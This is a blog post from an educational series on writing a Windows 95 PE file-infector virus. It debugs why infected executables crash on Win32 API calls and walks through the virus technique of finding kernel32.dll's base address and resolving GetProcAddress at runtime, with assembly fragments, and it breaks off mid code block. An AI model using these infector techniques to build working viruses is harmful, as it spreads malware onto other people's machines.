<!doctype html><html lang=en-us><head><title>Using kernel32.dll exports like a virus | VeXation</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="Dynamically finding the Win95 kernel32.dll base address and exported APIs."><meta name=generator content="Hugo 0.99.1"><meta name=ROBOTS content="NOINDEX, NOFOLLOW"><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/css/custom.css><link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon></head><body><nav class=navigation><a href=/><span class=arrow>‚Üê</span>Home</a>
<a href=/posts>Archive</a>
<a href=/about>About</a>
<a class=button href=https://log.vexation.ca/index.xml>Subscribe</a></nav><main class=main><section id=single><h1 class=title>Using kernel32.dll exports like a virus</h1><div class=tip><time datetime="2019-04-22 00:00:00 +0000 UTC">Apr 22, 2019</time></div><aside class=toc><details><summary>Table of Contents</summary><div><nav id=TableOfContents><ul><li><a href=#continued-recap>Continued Recap</a></li><li><a href=#understanding-the-problem>Understanding the problem</a><ul><li><a href=#generation-0>Generation 0</a></li><li><a href=#generation-1>Generation 1</a></li></ul></li><li><a href=#what-to-do>What to do?</a><ul><li><a href=#hard-coding>Hard-coding</a></li><li><a href=#diy>DIY</a></li></ul></li><li><a href=#exploring-the-solution>Exploring the solution</a><ul><li><a href=#wheres-kernel32dll>Where&rsquo;s kernel32.dll?</a></li><li><a href=#dll-exports>DLL Exports</a></li><li><a href=#link-it-yourself>Link it yourself</a></li></ul></li><li><a href=#convenient-macros>Convenient Macros</a><ul><li><a href=#required_api>REQUIRED_API</a></li><li><a href=#desc_runtime_api>DESC_RUNTIME_API</a></li><li><a href=#link_api>LINK_API</a></li><li><a href=#call_runtime_api>CALL_RUNTIME_API</a></li></ul></li><li><a href=#next-steps>Next Steps</a></li><li><a href=#a-virus-at-last>A virus at last!</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></details></aside><div class=content><p>Welcome back! If this is your first visit to VeXation you may want to start by reading about <a href=../welcome>the project</a>, the <a href=../setup>development environment</a>, the work in progress <a href=../pe-infector-basics>PE infector virus</a>, or the previous post about <a href=../delta-offset>delta offsets</a>.</p><h1 id=continued-recap>Continued Recap <a href=#continued-recap class=anchor>üîó</a></h1><p>At the end of the <a href=../delta-offset>last post</a> I completed <a href=https://github.com/cpu/vexation/tree/master/pijector target=_blank rel=noopener><code>pijector</code></a>, an updated version of <a href=https://github.com/cpu/vexation/tree/master/minijector target=_blank rel=noopener><code>minijector</code></a>. <code>pijector</code> is a PE executable file infector virus that can add its code to <code>.exe</code> files found in the same directory by adding a new section to the infected target. The injected code is self-contained and position independent.</p><p>There are two big shortcomings with <code>pijector</code> that prevent it from being a functional virus. Recall that in generation 1+:</p><ol><li>The way the virus code uses Win32 API functions will not work - a layer of indirection was broken and the first API function call will crash.</li><li>The original entrypoint of the infected program is never called. The host program is effectively broken by the infection.</li></ol><p>Today I&rsquo;ll describe how I worked through solving the Win32 API problems. With that out of the way I&rsquo;ll be in a good position to describe how I handled the original entrypoint problem in a future post.</p><p>Let&rsquo;s jump right in!</p><h1 id=understanding-the-problem>Understanding the problem <a href=#understanding-the-problem class=anchor>üîó</a></h1><p>To understand why the Win32 API function invocations in the <code>pijector</code> virus code were broken I started by comparing the execution of generation 0 and generation 1 in a debugger. By carefully stepping through the first win32 function call in the virus code in both generations and comparing the results I was able to build a picture of the problem. <em>(If you already feel comfortable with this you might want to <a href=#what-to-do>jump ahead</a>)</em>.</p><h2 id=generation-0>Generation 0 <a href=#generation-0 class=anchor>üîó</a></h2><p>I started by running the generation 0 <code>pijector.exe</code> in <code>td32</code> and switching to the CPU view.</p><p><p class=markdown-image><figure><a href=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.1.png><picture><source media="(max-width: 420px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.1_hube0857f3c98a7bf79eed3c50a4213eeb_29491_400x0_resize_q75_h2_box_3.webp><source media="(max-width: 920px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.1_hube0857f3c98a7bf79eed3c50a4213eeb_29491_600x0_resize_q75_h2_box_3.webp><source media="(max-width: 1400px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.1_hube0857f3c98a7bf79eed3c50a4213eeb_29491_800x0_resize_q75_h2_box_3.webp><img alt="TD32 Debugging Gen0 pijector" title="TD32 Debugging Gen0 pijector" src=td32.gen0.1.png loading=lazy class=img-fluid></picture></a><figcaption>Debugging Gen0 pijector.exe</figcaption></figure></p></p><p>The first Win32 API function the <code>pijector</code> virus code uses is <a href=https://docs.microsoft.com/en-us/windows/desktop/api/fileapi/nf-fileapi-findfirstfilea target=_blank rel=noopener><code>FindFirstFileA</code></a> exported from <code>C:\windows\system\kernel32.dll</code>.</p><p>In the source code the <code>call</code> looks like:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#a6e22e>call</span> FindFirstFileA, eax, ebx
</span></span></code></pre></div><p>In the disassembly view it looks like:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#a6e22e>push</span> ebx
</span></span><span style=display:flex><span><span style=color:#a6e22e>push</span> eax
</span></span><span style=display:flex><span><span style=color:#a6e22e>call</span> PIJECTOR.0040165C
</span></span></code></pre></div><p>I was expecting that the call target would be a memory address somewhere in the <code>kernel32.dll</code> address space but the disassembly view shows a target inside of <code>pijector</code>&rsquo;s address space: <code>PIJECTOR.0040165C</code>. Already the debugger is challenging my assumptions!</p><p>Seeing a call to an unknown address the first question I have is &ldquo;what code is at <code>0x0040165C</code>&rdquo;? One way to check that in <code>td32</code> is to &ldquo;follow&rdquo; the <code>call</code> by right clicking the line and choosing &ldquo;Follow&rdquo;.</p><p><p class=markdown-image><figure><a href=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.2.png><picture><source media="(max-width: 420px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.2_huf8d6e57964fb3a65f0b6b7c7ed4cfa41_28357_400x0_resize_q75_h2_box_3.webp><source media="(max-width: 920px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.2_huf8d6e57964fb3a65f0b6b7c7ed4cfa41_28357_600x0_resize_q75_h2_box_3.webp><source media="(max-width: 1400px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.2_huf8d6e57964fb3a65f0b6b7c7ed4cfa41_28357_800x0_resize_q75_h2_box_3.webp><img alt="TD32 Following Call" title="TD32 Following Call" src=td32.gen0.2.png loading=lazy class=img-fluid></picture></a><figcaption>Following a call jmp.</figcaption></figure></p></p><p>Now <code>td32</code> shows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#a6e22e>jmp</span> [<span style=color:#ae81ff>00403060</span>]
</span></span></code></pre></div><p>So the call takes the debugger to a <code>jmp</code> instruction to the address specified at <code>0x00403060</code>. Choosing &ldquo;Data&rdquo; in the <code>td32</code> menu followed by &ldquo;Inspect&rdquo; pops up a window that I used to quickly peek at what address the <code>jmp</code> will go to before following it.</p><p><p class=markdown-image><figure><a href=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.3.png><picture><source media="(max-width: 420px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.3_hud2f874cd3f06423ce5309a863ca4fd36_27122_400x0_resize_q75_h2_box_3.webp><source media="(max-width: 920px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.3_hud2f874cd3f06423ce5309a863ca4fd36_27122_600x0_resize_q75_h2_box_3.webp><source media="(max-width: 1400px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.3_hud2f874cd3f06423ce5309a863ca4fd36_27122_800x0_resize_q75_h2_box_3.webp><img alt="TD32 Inspect" title="TD32 Inspect" src=td32.gen0.3.png loading=lazy class=img-fluid></picture></a><figcaption>Inspecting a jmp target.</figcaption></figure></p></p><p>Entering <code>[00403060]</code> as the expression (just like in the disassembly) shows the <code>dword</code> hex value:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>x82C8F140</span>
</span></span></code></pre></div><p>That looks more like what I was expecting initially: an address in <code>kernel32.dll</code>. Following the <code>jmp [00403060]</code> instruction confirms the debugger does end up in the <code>kernel32.dll</code> address space.</p><p><p class=markdown-image><figure><a href=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.4.png><picture><source media="(max-width: 420px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.4_hu99b19ae9409317abf19fd06f7e60bd14_29471_400x0_resize_q75_h2_box_3.webp><source media="(max-width: 920px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.4_hu99b19ae9409317abf19fd06f7e60bd14_29471_600x0_resize_q75_h2_box_3.webp><source media="(max-width: 1400px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen0.4_hu99b19ae9409317abf19fd06f7e60bd14_29471_800x0_resize_q75_h2_box_3.webp><img alt="TD32 Following call again" title="TD32 Following call again" src=td32.gen0.4.png loading=lazy class=img-fluid></picture></a><figcaption>Following the call.</figcaption></figure></p></p><p>Now the disassembly shows:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#a6e22e>push</span> BFF77A18
</span></span><span style=display:flex><span><span style=color:#a6e22e>jmp</span> KERNEL32.BFF93BD3
</span></span></code></pre></div><p>Very interesting! It&rsquo;s already pretty clear that there is some indirection between the virus code&rsquo;s <code>call</code>s to Win32 APIs and how control eventually ends up in the <code>kernel32.dll</code> address space.</p><p>Some of the addresses from this debugging experiment make more sense when compared with <code>tdump</code> output of both <a href=https://github.com/cpu/vexation/blob/master/pijector/pijector.exe.tdump.txt target=_blank rel=noopener><code>pijector</code></a> and <a href=https://github.com/cpu/vexation/blob/master/apifind/kernel32.dll.tdump.txt target=_blank rel=noopener><code>kernel32.dll</code></a>.</p><p>First, the <code>jmp [00403060]</code> instruction is interesting because the <a href=https://github.com/cpu/vexation/blob/master/pijector/pijector.exe.tdump.txt target=_blank rel=noopener><code>tdump</code> of <code>pijector</code></a> shows that <code>0x00403060</code> is in the <code>.idata</code> section.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-text data-lang=text><span style=display:flex><span>Object table:
</span></span><span style=display:flex><span>#   Name      VirtSize    RVA     PhysSize  Phys off  Flags   
</span></span><span style=display:flex><span>--  --------  --------  --------  --------  --------  --------
</span></span><span style=display:flex><span>01  CODE      00001000  00001000  00000800  00000600  60000020 [CER]
</span></span><span style=display:flex><span>02  DATA      00001000  00002000  00000000  00000E00  C0000040 [IRW]
</span></span><span style=display:flex><span>03  .idata    00001000  00003000  00000200  00000E00  C0000040 [IRW]
</span></span><span style=display:flex><span>04  .reloc    00001000  00004000  00000200  00001000  50000040 [ISR]
</span></span></code></pre></div><p>I could tell this quickly because subtracting the base address of <code>pijector.exe</code> (<code>0x00400000</code>) from the address in the <code>jmp</code> reference (<code>0x00403060</code>) gives <code>0x00003060</code>. Since <code>0x00003060</code> is larger than <code>0x00003000</code> (which is the <code>RVA</code> of the <code>.idata</code> section) and smaller than <code>0x00004000</code> (which is the <code>RVA</code> of the <code>.reloc</code> section) the pointer that&rsquo;s used for the <code>jmp</code> target must be in <code>.idata</code>.</p><p>The <code>push BFF77A18</code> instruction that <code>jmp [00403060]</code> brings execution to is interesting when matched up to a <a href=https://github.com/cpu/vexation/blob/master/apifind/kernel32.dll.tdump.txt target=_blank rel=noopener><code>tdump</code> of <code>C:\windows\sytem\kernel32.dll</code></a>. (<em>Isn&rsquo;t it handy that <code>tdump</code> works with <code>.dlls</code> too?</em>)</p><p>In my <code>kernel32.dll</code>&rsquo;s exports the <code>FindFirstFileA</code> function appears like so:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-text data-lang=text><span style=display:flex><span>    0249    00007a18  FindFirstFileA
</span></span></code></pre></div><p>It has ordinal number 249 and the RVA <code>0x00007a18</code>. Adding the <code>kernel32.dll</code> base address <code>0xBFF70000</code> (more on finding that later) to the <code>FindFirstFileA</code> RVA gives <code>0xBFF77A18</code> - the argument from the <code>push</code> instruction!</p><p>What does it all mean? In summary:</p><ul><li>First, <code>call FindFirstFileA</code> in generation 0 doesn&rsquo;t immediately call into <code>kernel32.dll</code> code.</li><li>Instead, it calls a local address that <code>jmp</code>s to a memory address specified in a pointer in the <code>.idata</code> section</li><li>Finally, the <code>jmp</code> takes execution into <code>kernel32.dll</code> where the exported <code>FindFirstFileA</code> function address gets pushed.</li></ul><p>(<em>note: Some of the above is specific to <code>tasm32</code>/<code>tlink32</code> but in general it works similarly for other assemblers/linkers</em>).</p><p>Why so much indirection? One reason is that it lets the operating system loader populate the <code>.idata</code> section with pointers to imported <code>kernel32.dll</code> functions without having to update each individual call site in the code section(s).</p><p>(<em>note: For a more rigorous explanation of these mechanisms see the <a href="https://docs.microsoft.com/en-us/previous-versions/ms809762%28v=msdn.10%29" target=_blank rel=noopener>&ldquo;Peering inside the PE&rdquo;</a> MSDN article, particularly <a href="https://docs.microsoft.com/en-us/previous-versions/ms809762%28v=msdn.10%29#pe-file-imports" target=_blank rel=noopener>&ldquo;PE file Imports&rdquo;</a> and <a href="https://docs.microsoft.com/en-us/previous-versions/ms809762%28v=msdn.10%29#pe-file-exports" target=_blank rel=noopener>&ldquo;PE File Exports&rdquo;</a>)</em>.</p><p>Now that I had seen how the API function invocation works in generation 0 it was time to turn to the generation 1 code that crashes. Ignoring any other resources it&rsquo;s possible to start to see the problem based on what&rsquo;s known from stepping through generation 0.</p><p>The indirection I observed relied on pointers in an <code>.idata</code> section but the virus code only creates one new <code>.ireloc</code> section in the target. Nothing carries forward or corrects for the missing <code>.idata</code> pointers. I used the same process of following an API call in <code>td32</code> with the generation 1 <code>calc.exe</code> to verify that idea.</p><h2 id=generation-1>Generation 1 <a href=#generation-1 class=anchor>üîó</a></h2><p>Loading the infected generation 1 <code>calc.exe</code> in <code>td32</code> I saw the <code>call FindFirstFileA</code> Win32 API function call in the virus code a few instructions from the top, after the delta offset calculation. Similar to the Generation 0 disassembly the function call is a <code>call</code> to a memory address inside of <code>calc.exe</code>&rsquo;s address space.</p><p><p class=markdown-image><figure><a href=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.1.png><picture><source media="(max-width: 420px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.1_huc60f79b684c875c0a4429335e641a8ce_27222_400x0_resize_q75_h2_box_3.webp><source media="(max-width: 920px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.1_huc60f79b684c875c0a4429335e641a8ce_27222_600x0_resize_q75_h2_box_3.webp><source media="(max-width: 1400px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.1_huc60f79b684c875c0a4429335e641a8ce_27222_800x0_resize_q75_h2_box_3.webp><img alt="TD32 Debugging infected calc.exe" title="TD32 Debugging infected calc.exe" src=td32.gen1.1.png loading=lazy class=img-fluid></picture></a><figcaption>Debugging gen1 calc.exe</figcaption></figure></p></p><p>In generation 0 the disassembly was:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#a6e22e>call</span> PIJECTOR.0040165C
</span></span></code></pre></div><p>In generation 1 the disassembly is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#a6e22e>call</span> <span style=color:#ae81ff>0x0041365C</span>
</span></span></code></pre></div><p>The difference in address (<code>0x0040165C</code> vs <code>0x0041365C</code>) is explained by the location of the code. In both cases the <code>call</code>&rsquo;s relative target was <code>0x0000065C</code> but the location of the <code>call</code> itself differed.</p><p>In generation 0 the executable&rsquo;s base address was <code>0x00400000</code> and the <code>CODE</code> section&rsquo;s RVA was <code>0x00001000</code>. If I add the base address, the section RVA, and the relative target I get the generation 0 call target: <code>0x00400000</code> + <code>0x00001000</code> + <code>0x0000065C</code> = <code>0x0040165C</code>.</p><p>In generation 1 the executable&rsquo;s base address was still <code>0x00400000</code> but the <code>.ireloc</code> section that the <code>call</code> instruction is in has an RVA of <code>0x00013000</code>. If I add the base address, the section RVA, and the relative target again I get the generation 1 call target: <code>0x00400000</code> + <code>0x00013000</code> + <code>0x0000065C</code> = <code>0x0041365C</code>.</p><p>So far execution has looked the same. Moving on to following the <code>call</code> will answer the question &ldquo;What code is at <code>0x0041365C</code> in <code>calc.exe</code>?&rdquo;.</p><p><p class=markdown-image><figure><a href=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.2.png><picture><source media="(max-width: 420px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.2_hu28ee2d9bf80a428d48c2fe6c45746836_28675_400x0_resize_q75_h2_box_3.webp><source media="(max-width: 920px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.2_hu28ee2d9bf80a428d48c2fe6c45746836_28675_600x0_resize_q75_h2_box_3.webp><source media="(max-width: 1400px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.2_hu28ee2d9bf80a428d48c2fe6c45746836_28675_800x0_resize_q75_h2_box_3.webp><img alt="TD32 Following call" title="TD32 Following call" src=td32.gen1.2.png loading=lazy class=img-fluid></picture></a><figcaption>Following gen1 calc.exe call.</figcaption></figure></p></p><p>The disassembly shows a <code>jmp</code> instruction and its target (<code>[CALC.00403060]</code>) looks the same as in generation 0. So far so good.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#a6e22e>jmp</span> [CALC.00403060]
</span></span></code></pre></div><p>Using the data inspector window again the address at <code>[00403060]</code> for the <code>jmp</code> target can be checked:</p><p><p class=markdown-image><figure><a href=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.3.png><picture><source media="(max-width: 420px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.3_hu3ebb49f37dbe47bf7cb4abb2a816782d_28290_400x0_resize_q75_h2_box_3.webp><source media="(max-width: 920px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.3_hu3ebb49f37dbe47bf7cb4abb2a816782d_28290_600x0_resize_q75_h2_box_3.webp><source media="(max-width: 1400px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.3_hu3ebb49f37dbe47bf7cb4abb2a816782d_28290_800x0_resize_q75_h2_box_3.webp><img alt="TD32 Inspecting call target" title="TD32 Inspecting call target" src=td32.gen1.3.png loading=lazy class=img-fluid></picture></a><figcaption>Inspecting gen1 calc.exe call target.</figcaption></figure></p></p><p>This time it shows a DWORD with the hex value:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>0</span><span style=color:#a6e22e>xFE830574</span>
</span></span></code></pre></div><p>This address looks totally wrong and it isn&rsquo;t the same target that Generation 0 jumped to. A smoking gun!</p><p>Letting the debugger follow the <code>jmp [CALC.00403060]</code> instruction sends it to la-la land.</p><p><p class=markdown-image><figure><a href=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.4.png><picture><source media="(max-width: 420px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.4_hu92018a3c2a88156e2187f0eca1cde9a8_23538_400x0_resize_q75_h2_box_3.webp><source media="(max-width: 920px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.4_hu92018a3c2a88156e2187f0eca1cde9a8_23538_600x0_resize_q75_h2_box_3.webp><source media="(max-width: 1400px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.4_hu92018a3c2a88156e2187f0eca1cde9a8_23538_800x0_resize_q75_h2_box_3.webp><img alt="TD32 Debugger following call" title="TD32 Debugger following call" src=td32.gen1.4.png loading=lazy class=img-fluid></picture></a><figcaption>TD32 follows the call to nowhere.</figcaption></figure></p></p><p><p class=markdown-image><figure><a href=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.5.png><picture><source media="(max-width: 420px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.5_hu61c609b9bd9f34d231572a4938fca39e_24086_400x0_resize_q75_h2_box_3.webp><source media="(max-width: 920px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.5_hu61c609b9bd9f34d231572a4938fca39e_24086_600x0_resize_q75_h2_box_3.webp><source media="(max-width: 1400px)" srcset=/2019/04/using-kernel32.dll-exports-like-a-virus/td32.gen1.5_hu61c609b9bd9f34d231572a4938fca39e_24086_800x0_resize_q75_h2_box_3.webp><img alt="TD32 Access violation error" title="TD32 Access violation error" src=td32.gen1.5.png loading=lazy class=img-fluid></picture></a><figcaption>calc.exe causes an access violation. RIP</figcaption></figure></p></p><p>Ultimately the <code>jmp</code> causes an access violation and <code>calc.exe</code> crashes shortly after.</p><h1 id=what-to-do>What to do? <a href=#what-to-do class=anchor>üîó</a></h1><p>It&rsquo;s clear the indirection used by generation 0 is a problem in generation 1+. The target of the <code>jmp</code> in the indirected <code>kernel32.dll</code> API call is read from an address that only made sense in generation 0. Similar to the problem of variable references across multiple sections that I tacked in the <a href=../delta-offset>delta offsets post</a> the easiest solution is one of simplification: stop using the system loader to resolve <code>kernel32.dll</code> function references and stop relying on pointers in the <code>.idata</code> section.</p><h2 id=hard-coding>Hard-coding <a href=#hard-coding class=anchor>üîó</a></h2><p>The earliest win32 viruses avoided the system loader by hard-coding the addresses of the exported DLL functions they used. Imagine if instead of using <code>call FindFirstFileA</code> the <code>pijector</code> code instead used <code>call 0xBFF77A18</code>. As long as the <code>kernel32.dll</code> export for <code>FindFirstFileA</code> was <em>always</em> at RVA <code>0x00007A18</code> and <code>kernel32.dll</code> was <em>always</em> loaded at <code>0xBFF70000</code> this would be smooth sailing. Of course in practice all of these things change. Even differences as inconsequential seeming as the configured system locale can result in breaking hard-coded addresses.</p><h2 id=diy>DIY <a href=#diy class=anchor>üîó</a></h2><p>Another way to approach this problem (and the route I chose) is to have the virus code act like its own little linker/loader and find the addresses of the DLL functions required at runtime. This turns out to be a fun way to get some hands on experience playing with concepts from <a href=https://en.wikipedia.org/wiki/Dynamic_linker target=_blank rel=noopener>dynamic linking</a> and <a href=https://en.wikipedia.org/wiki/Loader_%28computing%29 target=_blank rel=noopener>operating system loaders</a>.</p><p>In Windows dynamic linking is the domain of <a href=https://support.microsoft.com/en-us/help/815065/what-is-a-dll target=_blank rel=noopener>Dynamic Link Libraries</a> (.dlls). The best part is that DLLs are implemented as PE executables! Having already written x86 ASM for manipulating PE metadata it&rsquo;s straight-forward to get right into working with the <code>kernel32</code> DLL. That&rsquo;s also the reason that the trusty <code>tdump</code> tool has no problem with DLLs.</p><p>There&rsquo;s one other handy Windows trick that the virus code can use to do its runtime linking of external DLL functions: <a href=https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getprocaddress target=_blank rel=noopener><code>kernel32.GetProcAddress</code></a>. This is an exported function from <code>kernel32.dll</code> that finds the address of any exported DLL function given its name and the DLL&rsquo;s base address.</p><p>The <code>GetProcAddress</code> function presents a nice short-cut. All the virus has to do is somehow find <code>kernel32.dll</code> and the address of the <code>GetProcAddress</code> function and from there it&rsquo;s easy to find any other required API addresses in a way that won&rsquo;t rely on the <code>.idata</code> section or any hard-coded offsets.</p><h1 id=exploring-the-solution>Exploring the solution <a href=#exploring-the-solution class=anchor>üîó</a></h1><p>Since the task of finding win32 API function addresses from <code>kernel32.dll</code> at runtime is fairly self-contained I decided to start by experimenting with a stand-alone program separate from the PE infector virus code. Once I had a good solution I integrated it back into the virus code.</p><p>I decided to call the standalone program <code>apifind</code> since that&rsquo;s what it was going to do. At a high level the <code>apifind</code> code:</p><ol><li>Finds <code>kernel32.dll</code>&rsquo;s base address</li><li>Finds <code>kernel32.dll</code>&rsquo;s <code>IMAGE_EXPORT_DIRECTORY</code> structure</li><li>Finds the index of <code>GetProcAddress</code> in <code>IMAGE_EXPORT_DIRECTORY.AddressOfNames</code></li><li>Uses the index to find the <code>GetProcAddress</code> ordinal in <code>IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals</code>.</li><li>Uses the ordinal of <code>GetProcAddress</code> to find the export RVA in <code>IMAGE_EXPORT_DIRECTORY.AddressOfFunctions</code></li><li>Uses the discovered RVA of <code>GetProcAddress</code> to find other required APIs (e.g. <code>kernel32.FindFirstFileA</code>).</li></ol><p>The complete assembly code for <code>apifind</code> is available <a href=https://github.com/cpu/vexation/tree/master/apifind target=_blank rel=noopener>in the VeXation Github repo</a>.</p><h2 id=wheres-kernel32dll>Where&rsquo;s kernel32.dll? <a href=#wheres-kernel32dll class=anchor>üîó</a></h2><p>The first thing <code>apifind</code> needs to do is find the base address where <code>kernel32.dll</code> is loaded.</p><p>If you&rsquo;re familiar with more modern (e.g. Windows 2000/NT+) malware you might know of a trick for this based on chasing pointers from the Process Environment Block (PEB) to a list of loaded modules. On Windows 2000/NT/XP <code>kernel32.dll</code>&rsquo;s location in the module list was predictable and so offered a reliable way to find the base address dynamically. Since I&rsquo;m targeting Windows 95 it&rsquo;s totally not applicable and another approach needs to be taken.</p><p>The &ldquo;trick&rdquo; I used instead is an even older one. The first reference I saw was in 29A issue 04 from 1999 and an article by &ldquo;LethalMind&rdquo; called &ldquo;RETRIEVING API&rsquo;S ADRESSES&rdquo; (sic). I suspect the trick predates this article as well. (<em>Can you even call it a &ldquo;trick&rdquo;? On some level it&rsquo;s just &ldquo;The Way Things Work&rdquo;</em>).</p><p>The core idea is to take advantage of the fact that it&rsquo;s <code>kernel32.dll</code> that calls every program&rsquo;s entrypoint when it&rsquo;s first started by the operating system. More specifically it&rsquo;s the <code>kernel32.dll</code>&rsquo;s <code>CreateProcess</code> function that calls the program&rsquo;s entrypoint. Since the virus code replaces the infected program&rsquo;s original entrypoint I know that at the start of the virus code&rsquo;s execution the return address on the top of the stack will be pointing back into <code>kernel32.dll</code> somewhere.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-tasm data-lang=tasm><span style=display:flex><span>@@findkernel32:
</span></span><span style=display:flex><span>  <span style=color:#75715e>; Put the dword value from the top of the stack into esi. This is the return</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>; address for the kernel32.CreateProcess function call one frame above us and</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>; points somewhere in kernel32.dll.</span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mov</span> esi, <span style=color:#66d9ef>dword</span> ptr [esp]
</span></span></code></pre></div><p>Since <code>kernel32.dll</code> is a DLL and DLLs are portable executables I know what the start of <code>kernel32.dll</code> will look like: It should have a DOS header with the magic <code>MZ</code> bytes. Further, I know it will be section aligned in memory. All of that PE knowledge from previous posts keeps coming in handy!</p><p>Using the return address from the stack the virus code can search backwards by the size of a section, looking for the DOS header magic bytes. When it finds a section aligned address that has the expected header it will be the base address of <code>kernel32.dll</code>.</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
